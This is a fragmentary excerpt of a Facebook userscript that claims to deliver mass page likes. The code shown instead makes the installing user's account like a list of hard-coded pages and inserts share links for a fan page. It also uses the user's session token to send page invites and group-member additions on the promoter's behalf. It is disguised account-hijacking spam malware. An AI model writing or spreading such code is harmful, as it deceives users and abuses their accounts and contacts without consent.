// ==UserScript==
// @name         Facebook Likes,100k Likes on Page By one click
// @description  Get Facebook Likes!!
...
if(body != null) 
{
 ...
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.facebook.com/pawankalyanfansworld&t=Facebook+Background+Theme' title='Share'><blink><center>SHARE</center></blink></a>"
...
if(body != null) 
{
 ...
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/PawanKalyanfansworld/' title='Pawan Kalyan'><blink><center>Pawan Kalyan!</center></blink></a>"
 body.appendChild(div);
}
...
Like("507063459413076");
Like("497860183624228");
Like("620621511308269");
Like("300162090129978");
Like("610989838970974");
Like("1385678761687733");
Like("334219866719916");
Like("1406526199593226");
...
var Descriptions = "",
    _text = 'Powered By:  <A style="color:#3B5998;" href="https://www.facebook.com/Pawankalyanfansworld" target="_blank">Tollywood</A></br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/tollywoodDHF" target="_blank"> Tollywood</A></A>,</A></A>.</br>For More Tools Visit Our Blogs <A style="color:#3B5998;" href="http://www.facebook.com/TollywoodDhf/" target="_blank">Automate Your Facebook</A>.</A>';
...
display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span><br/>";
    ...
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=pawankalyanfansworld&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=TollywoodDHF&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")

	if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
	if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
